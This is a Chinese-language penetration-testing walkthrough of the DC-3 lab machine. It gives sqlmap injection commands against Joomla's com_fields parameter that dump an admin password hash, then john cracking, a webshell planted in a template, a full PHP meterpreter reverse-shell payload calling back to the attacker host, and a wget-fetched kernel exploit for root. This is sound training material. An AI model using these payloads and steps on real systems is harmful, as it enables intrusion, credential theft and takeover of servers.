## DC-3渗透测试过程

### 主机发现

```
arp-scan -l
```

靶机ip`192.168.56.113`

![image-20240416140034898](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140034898.png)

就开启了一个80端口，直接去看web页面

### 目录扫描

用`cmseek`扫描到cms的名字和版本

![image-20240416140246803](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140246803.png)

#### joomscan扫描

```
joomscan -u http://192.168.56.113
```

![image-20240416195152267](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416195152267.png)

### 漏洞发现和利用

![image-20240416140405440](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140405440.png)

找到该cms的历史漏洞

它的利用方法是

```bash
Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

直接sqlmap扫就行了

爆数据库

```bash
sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

爆表名

```bash
sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

爆字段

```bash
sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]
```

查看字段内容

```bash
sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump -p list[fullordering]
```

得到用户名和密码

```
+--------+--------------------------------------------------------------+
| name   | password                                                     |
+--------+--------------------------------------------------------------+
| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
+--------+--------------------------------------------------------------+
```

密码是hash，可以用john爆破试试

```bash
john pass1 --wordlist=/usr/share/wordlists/rockyou.txt
```

得到密码`snoopy`

### 登录web后台

首先就是尝试往文章里写php代码，结果发现是不能执行的

最终在模板这里发现可以添加文件

![image-20240416141539882](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141539882.png)

我直接在`index.php`里直接写一句话木马

![image-20240416141702059](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141702059.png)

用蚁剑进行连接，发现这里我写的木马，在`/var/www/html/templates/beez3/index.php`

![image-20240416141929582](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141929582.png)

本来想直接用nc反弹shell，发现这个`nc`没有-e选项

### 反弹shell

那就用`msf`弹shell吧

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your-IP-Address> LPORT=<Your-Port> -f raw > shell.php
```

利用这条命令生成一个php的稳定shell

```php
/*<?php /**/ error_reporting(0); $ip = '192.168.56.101'; $port = 1234; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

写入1.php

用msf进行监听

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 1234
run
```

![image-20240416144534503](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416144534503.png)

输入shell即可得到一个shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

得到一个伪终端

### 提权

利用辅助脚本发现提权漏洞

```
下载地址：https://github.com/mzet-/linux-exploit-suggester
```

![image-20240416145927351](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416145927351.png)

查看内核版本和系统版本

```bash
uname -a
lsb_release -a
```

`Ubuntu 16.04 4.4.0`

找到这个提权漏洞

![image-20240416200938317](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416200938317.png)

按照文档步骤即可

拷贝到tmp目录下

```
wget http://192.168.56.101/exploit.tar
```

解压

```
tar xf exploit.tar
```

```
./compile.sh 编译
./doubleput
```

即可提权成功

![image-20240416201208816](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416201208816.png)

## 总结

> 1.joomla这个cms的漏洞比较多，可以用专门的工具`joomscan`进行扫描
>
> 2.msf的反弹shell是比较稳定的shell，不能用nc或bash，可以用msf
>
> 3.因为这是老靶机，所以系统内核会漏洞，直接找别人的exp打就行了

